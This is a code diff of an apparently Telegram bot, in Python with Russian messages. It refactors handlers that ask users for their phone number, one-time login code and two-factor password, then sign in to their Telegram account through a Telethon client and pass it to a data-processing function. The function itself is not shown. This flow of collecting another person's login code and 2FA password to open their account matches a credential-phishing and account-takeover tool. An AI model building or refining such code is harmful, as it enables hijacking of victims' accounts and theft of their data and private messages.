@@ -75,8 +75,6 @@ async def send_welcome(message: types.Message):
 async def get_phone_number(message: types.Message):
     phone_number = message.text
     
-    user_state[message.from_user.id] = {'phone_number': phone_number, 'attempts': 0}
-    
     try:
         # Создаем новый экземпляр клиента
         client = create_client()
@@ -87,34 +85,35 @@ async def get_phone_number(message: types.Message):
             await client.log_out()
         
         phone_code_hash = await client.send_code_request(phone_number)
-        user_state[message.from_user.id]['phone_code_hash'] = phone_code_hash
-        user_state[message.from_user.id]['client'] = client  # Сохраняем клиент в user_state
+        user_state[message.from_user.id] = {
+            'phone_number': phone_number,
+            'attempts': 0,
+            'phone_code_hash': phone_code_hash,
+            'client': client
+        }
         await message.reply("Код отправлен на ваш номер. Пожалуйста, введите код, который вы получили.")
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
 
-
-@dp.message_handler(lambda message: message.text and 
-                    'phone_code_hash' in user_state.get(message.from_user.id, {}) and
-                    'awaiting_password' not in user_state.get(message.from_user.id, {}))
 @dp.message_handler(lambda message: message.text and 
                     'phone_code_hash' in user_state.get(message.from_user.id, {}) and
                     'awaiting_password' not in user_state.get(message.from_user.id, {}))
 async def get_code(message: types.Message):
     code = message.text
-    phone_number = user_state[message.from_user.id]['phone_number']
-    #phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
-    phone_code_hash = user_state[message.from_user.id]['phone_code_hash'].phone_code_hash
+    user_data = user_state.get(message.from_user.id)
+    if not user_data:
+        await message.reply("Ошибка: данные пользователя не найдены.")
+        return
+    
+    phone_number = user_data['phone_number']
+    phone_code_hash = user_data['phone_code_hash']
+    client = user_data['client']  # Используем сохраненный клиент
 
-
-    client = create_client()  # Создаем экземпляр клиента здесь
     try:
-        await client.connect()
-        
         # Проверяем, что пин-код состоит из 5 цифр
         if len(code) != 5 or not code.isdigit():
-            user_state[message.from_user.id]['attempts'] += 1
-            if user_state[message.from_user.id]['attempts'] >= 3:
+            user_data['attempts'] += 1
+            if user_data['attempts'] >= 3:
                 raise ValueError("Превышено количество попыток ввода кода. Пожалуйста, попробуйте позже.")
             raise ValueError("Пин-код должен состоять из 5 цифр.")
                 
@@ -122,34 +121,40 @@ async def get_code(message: types.Message):
         
         await message.reply("Успешная авторизация!")
         await process_user_data(client, phone_number, message.from_user.id)
-        # Сохраняем экземпляр клиента для последующего использования
-        user_state[message.from_user.id]['client'] = client
     except SessionPasswordNeededError:
         await message.reply("Необходим пароль двухфакторной аутентификации. Пожалуйста, введите ваш пароль.")
-        user_state[message.from_user.id]['awaiting_password'] = True
+        user_data['awaiting_password'] = True
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
+    finally:
+        # Не отключаем клиента, чтобы сохранить его для последующих попыток
+        pass
 
 @dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}))
 async def process_password(message: types.Message):
     password = message.text
-    phone_number = user_state[message.from_user.id]['phone_number']
-    phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
-    client = user_state[message.from_user.id]['client']  # Используем сохраненный экземпляр клиента
+    user_data = user_state.get(message.from_user.id)
+    if not user_data:
+        await message.reply("Ошибка: данные пользователя не найдены.")
+        return
+    
+    client = user_data['client']
+    phone_number = user_data['phone_number']
+    
     try:
         await client.connect()
-        
         await client.sign_in(password=password)
         await message.reply("Успешная авторизация!")
         await process_user_data(client, phone_number, message.from_user.id)
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
     finally:
-        user_state[message.from_user.id]['attempts'] += 1
-        if user_state[message.from_user.id]['attempts'] >= 3:
+        user_data['attempts'] += 1
+        if user_data['attempts'] >= 3:
             user_state.pop(message.from_user.id, None)
         await client.log_out()
         await client.disconnect()
+
 
 # Функция для создания нового экземпляра клиента
 def create_client():
